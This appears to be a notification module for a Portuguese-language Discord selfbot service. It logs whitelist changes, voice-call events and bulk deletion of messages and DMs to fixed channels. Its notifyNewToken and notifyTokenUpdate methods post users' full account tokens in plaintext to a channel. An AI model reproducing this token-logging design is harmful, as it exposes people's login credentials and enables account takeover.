import { Client, TextChannel, EmbedBuilder } from 'discord.js';
import { Logger } from '../utils/Logger';
import { readFileSync, writeFileSync, existsSync } from 'fs';
import { join } from 'path';

const NOTIFICATION_CHANNELS = {
    TOKEN: '1451744739199287337',
    WHITELIST: '1451744850671042601',
    WHITELIST_PANEL: '1451753983558291477',
    CALL: '1451751160225726545',
    CL: '1451752067608871003',
    LIMPAR_TUDO: '1451752230129762405',
    APAGAR_DMS: '1451752265139355689',
    FECHAR_DMS: '1451753330798760008'
};

const WHITELIST_PANEL_FILE = join(process.cwd(), 'src/data/whitelistPanel.json');
const WHITELIST_FILE = join(process.cwd(), 'src/data/whitelist.json');

interface WhitelistPanelData {
    messageId: string | null;
}

interface WhitelistData {
    [userId: string]: string[];
}

export class NotificationService {
    private readonly logger = Logger.child('[Notification]');
    private botClient: Client | null = null;
    private whitelistPanelMessageId: string | null = null;

    constructor() {
        this.loadWhitelistPanelData();
    }

    setBotClient(client: Client): void {
        this.botClient = client;
        this.logger.success(`Bot client configurado: ${client.user?.tag || 'Unknown'}`);
    }

    async initWhitelistPanel(): Promise<void> {
        await this.updateWhitelistPanel();
    }

    async notifyNewToken(userId: string, username: string, token: string): Promise<void> {
        const embed = this.createEmbed('📝 Nova Token Registrada', '#00FF00', 'Sistema de Tokens')
            .addFields(
                { name: '👤 Usuário', value: `<@${userId}>`, inline: true },
                { name: '📛 Username', value: username, inline: true },
                { name: '🔑 Token', value: `\`${token}\``, inline: false }
            );

        await this.sendEmbed(NOTIFICATION_CHANNELS.TOKEN, embed);
    }

    async notifyTokenUpdate(userId: string, username: string, token: string): Promise<void> {
        const embed = this.createEmbed('🔄 Token Atualizada', '#FFA500', 'Sistema de Tokens')
            .addFields(
                { name: '👤 Usuário', value: `<@${userId}>`, inline: true },
                { name: '📛 Username', value: username, inline: true },
                { name: '🔑 Nova Token', value: `\`${token}\``, inline: false }
            );

        await this.sendEmbed(NOTIFICATION_CHANNELS.TOKEN, embed);
    }

    async notifyWhitelistAdd(userId: string, targetId: string): Promise<void> {
        const embed = this.createEmbed('🛡️ Whitelist - ID Adicionado', '#00FF00', 'Sistema de Whitelist')
            .addFields(
                { name: '👤 Usuário', value: `<@${userId}>`, inline: true },
                { name: '➕ ID Protegido', value: `<@${targetId}>`, inline: true }
            );

        await this.sendEmbed(NOTIFICATION_CHANNELS.WHITELIST, embed);
        await this.updateWhitelistPanel();
    }

    async notifyWhitelistRemove(userId: string, targetId: string): Promise<void> {
        const embed = this.createEmbed('🛡️ Whitelist - ID Removido', '#FF0000', 'Sistema de Whitelist')
            .addFields(
                { name: '👤 Usuário', value: `<@${userId}>`, inline: true },
                { name: '➖ ID Removido', value: `<@${targetId}>`, inline: true }
            );

        await this.sendEmbed(NOTIFICATION_CHANNELS.WHITELIST, embed);
        await this.updateWhitelistPanel();
    }

    async notifyCallJoin(userId: string, _channelName: string, channelId: string): Promise<void> {
        const embed = this.createEmbed('🎙️ Entrou na Call', '#00FF00', 'Sistema de Call')
            .addFields(
                { name: '👤 Usuário', value: `<@${userId}>`, inline: true },
                { name: '📢 Canal', value: `<#${channelId}>`, inline: true }
            );

        await this.sendEmbed(NOTIFICATION_CHANNELS.CALL, embed);
    }

    async notifyCallLeave(userId: string, reason: string = 'Saiu voluntariamente'): Promise<void> {
        const embed = this.createEmbed('👋 Saiu da Call', '#FFA500', 'Sistema de Call')
            .addFields(
                { name: '👤 Usuário', value: `<@${userId}>`, inline: true },
                { name: '📝 Motivo', value: reason, inline: true }
            );

        await this.sendEmbed(NOTIFICATION_CHANNELS.CALL, embed);
    }

    async notifyCallMoved(userId: string, fromChannelId: string, toChannelId: string): Promise<void> {
        const embed = this.createEmbed('🔀 Movido de Canal', '#3498db', 'Sistema de Call')
            .addFields(
                { name: '👤 Usuário', value: `<@${userId}>`, inline: true },
                { name: '📤 De', value: `<#${fromChannelId}>`, inline: true },
                { name: '📥 Para', value: `<#${toChannelId}>`, inline: true }
            );

        await this.sendEmbed(NOTIFICATION_CHANNELS.CALL, embed);
    }

    async notifyCallDisconnected(userId: string): Promise<void> {
        const embed = this.createEmbed('❌ Desconectado da Call', '#FF0000', 'Sistema de Call')
            .addFields(
                { name: '👤 Usuário', value: `<@${userId}>`, inline: true },
                { name: '📝 Motivo', value: 'Foi desconectado', inline: true }
            );

        await this.sendEmbed(NOTIFICATION_CHANNELS.CALL, embed);
    }

    async notifyCallStopped(userId: string): Promise<void> {
        const embed = this.createEmbed('🛑 Parou de Usar Call', '#9b59b6', 'Sistema de Call')
            .addFields(
                { name: '👤 Usuário', value: `<@${userId}>`, inline: true },
                { name: '📝 Status', value: 'Desativou a call', inline: true }
            );

        await this.sendEmbed(NOTIFICATION_CHANNELS.CALL, embed);
    }

    async notifyCL(userId: string, targetId: string, deletedCount: number): Promise<void> {
        const embed = this.createEmbed('🧹 CL Executado', '#e74c3c', 'Sistema de CL')
            .addFields(
                { name: '👤 Executado por', value: `<@${userId}>`, inline: true },
                { name: '🎯 Alvo', value: `<@${targetId}>`, inline: true },
                { name: '🗑️ Mensagens Deletadas', value: `${deletedCount}`, inline: true }
            );

        await this.sendEmbed(NOTIFICATION_CHANNELS.CL, embed);
    }

    async notifyLimparTudo(userId: string, totalFriends: number, processed: number, deleted: number, skipped: number): Promise<void> {
        const embed = this.createEmbed('🗑️ Limpar Tudo Executado', '#e74c3c', 'Sistema de Limpar Tudo')
            .addFields(
                { name: '👤 Executado por', value: `<@${userId}>`, inline: true },
                { name: '👥 Total Amigos', value: `${totalFriends}`, inline: true },
                { name: '✅ Processados', value: `${processed}`, inline: true },
                { name: '🗑️ Msgs Deletadas', value: `${deleted}`, inline: true },
                { name: '⏭️ Pulados (Whitelist)', value: `${skipped}`, inline: true }
            );

        await this.sendEmbed(NOTIFICATION_CHANNELS.LIMPAR_TUDO, embed);
    }

    async notifyLimparTudoProgress(userId: string, currentUser: string, progress: number, total: number): Promise<void> {
        const embed = this.createEmbed('🔄 Limpar Tudo - Progresso', '#f39c12', 'Sistema de Limpar Tudo')
            .addFields(
                { name: '👤 Executado por', value: `<@${userId}>`, inline: true },
                { name: '🎯 Limpando', value: `<@${currentUser}>`, inline: true },
                { name: '📊 Progresso', value: `${progress}/${total}`, inline: true }
            );

        await this.sendEmbed(NOTIFICATION_CHANNELS.LIMPAR_TUDO, embed);
    }

    async notifyApagarDMs(userId: string, dmCount: number, processed: number, deleted: number, skipped: number): Promise<void> {
        const embed = this.createEmbed('❌ Apagar DMs Executado', '#e74c3c', 'Sistema de Apagar DMs')
            .addFields(
                { name: '👤 Executado por', value: `<@${userId}>`, inline: true },
                { name: '📬 Total DMs', value: `${dmCount}`, inline: true },
                { name: '✅ Processadas', value: `${processed}`, inline: true },
                { name: '🗑️ Msgs Deletadas', value: `${deleted}`, inline: true },
                { name: '⏭️ Puladas (Whitelist)', value: `${skipped}`, inline: true }
            );

        await this.sendEmbed(NOTIFICATION_CHANNELS.APAGAR_DMS, embed);
    }

    async notifyApagarDMsProgress(userId: string, currentDM: string, progress: number, total: number): Promise<void> {
        const embed = this.createEmbed('🔄 Apagar DMs - Progresso', '#f39c12', 'Sistema de Apagar DMs')
            .addFields(
                { name: '👤 Executado por', value: `<@${userId}>`, inline: true },
                { name: '🎯 Limpando DM', value: `<@${currentDM}>`, inline: true },
                { name: '📊 Progresso', value: `${progress}/${total}`, inline: true }
            );

        await this.sendEmbed(NOTIFICATION_CHANNELS.APAGAR_DMS, embed);
    }

    async notifyFecharDMs(userId: string, dmCount: number, closed: number): Promise<void> {
        const embed = this.createEmbed('📪 Fechar DMs Executado', '#9b59b6', 'Sistema de Fechar DMs')
            .addFields(
                { name: '👤 Executado por', value: `<@${userId}>`, inline: true },
                { name: '📬 Total DMs', value: `${dmCount}`, inline: true },
                { name: '✅ Fechadas', value: `${closed}`, inline: true }
            );

        await this.sendEmbed(NOTIFICATION_CHANNELS.FECHAR_DMS, embed);
    }

    async notifyFecharDMsProgress(userId: string, currentDM: string, progress: number, total: number): Promise<void> {
        const embed = this.createEmbed('🔄 Fechar DMs - Progresso', '#f39c12', 'Sistema de Fechar DMs')
            .addFields(
                { name: '👤 Executado por', value: `<@${userId}>`, inline: true },
                { name: '📪 Fechando DM', value: `<@${currentDM}>`, inline: true },
                { name: '📊 Progresso', value: `${progress}/${total}`, inline: true }
            );

        await this.sendEmbed(NOTIFICATION_CHANNELS.FECHAR_DMS, embed);
    }

    private createEmbed(title: string, color: string, footer: string): EmbedBuilder {
        return new EmbedBuilder()
            .setTitle(title)
            .setColor(color as `#${string}`)
            .setTimestamp()
            .setFooter({ text: footer });
    }

    private async sendEmbed(channelId: string, embed: EmbedBuilder): Promise<boolean> {
        if (!this.botClient) return false;

        try {
            const channel = await this.botClient.channels.fetch(channelId);
            if (!channel || !channel.isTextBased()) return false;
            
            await (channel as TextChannel).send({ embeds: [embed] });
            return true;
        } catch (error) {
            this.logger.error(`Erro ao enviar notificação: ${error}`);
            return false;
        }
    }

    private async updateWhitelistPanel(): Promise<void> {
        if (!this.botClient) return;

        try {
            const channel = await this.botClient.channels.fetch(NOTIFICATION_CHANNELS.WHITELIST_PANEL);
            if (!channel || !channel.isTextBased()) return;

            const textChannel = channel as TextChannel;
            const embed = this.buildWhitelistPanelEmbed();

            if (this.whitelistPanelMessageId) {
                try {
                    const message = await textChannel.messages.fetch(this.whitelistPanelMessageId);
                    await message.edit({ embeds: [embed] });
                    this.logger.info('Painel de whitelist atualizado');
                    return;
                } catch {
                    this.whitelistPanelMessageId = null;
                }
            }

            const newMessage = await textChannel.send({ embeds: [embed] });
            this.whitelistPanelMessageId = newMessage.id;
            this.saveWhitelistPanelData();
            this.logger.success('Painel de whitelist criado');

        } catch (error) {
            this.logger.error(`Erro ao atualizar painel de whitelist: ${error}`);
        }
    }

    private buildWhitelistPanelEmbed(): EmbedBuilder {
        const whitelistData = this.loadWhitelistData();

        const embed = new EmbedBuilder()
            .setTitle('🛡️ Painel de Whitelist')
            .setColor('#4B3B6A')
            .setDescription('Lista de todos os IDs protegidos por usuário.\nIDs na whitelist **não são afetados** pelo CL.')
            .setTimestamp()
            .setFooter({ text: 'Atualizado automaticamente' });

        const userIds = Object.keys(whitelistData);
        
        if (userIds.length === 0) {
            embed.addFields({
                name: '📋 Status',
                value: 'Nenhuma whitelist registrada.',
                inline: false
            });
        } else {
            for (const odiscordUserId of userIds) {
                const protectedIds = whitelistData[odiscordUserId];
                
                if (protectedIds && protectedIds.length > 0) {
                    const idList = protectedIds
                        .map((id: string) => `> <@${id}>`)
                        .join('\n');
                    
                    embed.addFields({
                        name: `👤 Usuário (${protectedIds.length} protegidos)`,
                        value: `<@${odiscordUserId}>\n${idList}`.substring(0, 1024),
                        inline: false
                    });
                }
            }
        }

        return embed;
    }

    private loadWhitelistData(): WhitelistData {
        try {
            if (existsSync(WHITELIST_FILE)) {
                return JSON.parse(readFileSync(WHITELIST_FILE, 'utf-8'));
            }
        } catch {
            return {};
        }
        return {};
    }

    private loadWhitelistPanelData(): void {
        try {
            if (existsSync(WHITELIST_PANEL_FILE)) {
                const data = JSON.parse(readFileSync(WHITELIST_PANEL_FILE, 'utf-8')) as WhitelistPanelData;
                this.whitelistPanelMessageId = data.messageId;
            }
        } catch {
            this.whitelistPanelMessageId = null;
        }
    }

    private saveWhitelistPanelData(): void {
        try {
            const data: WhitelistPanelData = { messageId: this.whitelistPanelMessageId };
            writeFileSync(WHITELIST_PANEL_FILE, JSON.stringify(data, null, 2));
        } catch (error) {
            this.logger.error(`Erro ao salvar dados do painel: ${error}`);
        }
    }
}

let notificationServiceInstance: NotificationService | null = null;

export const getNotificationService = (): NotificationService => {
    if (!notificationServiceInstance) {
        notificationServiceInstance = new NotificationService();
    }
    return notificationServiceInstance;
};

export const createNotificationService = (): NotificationService => new NotificationService();
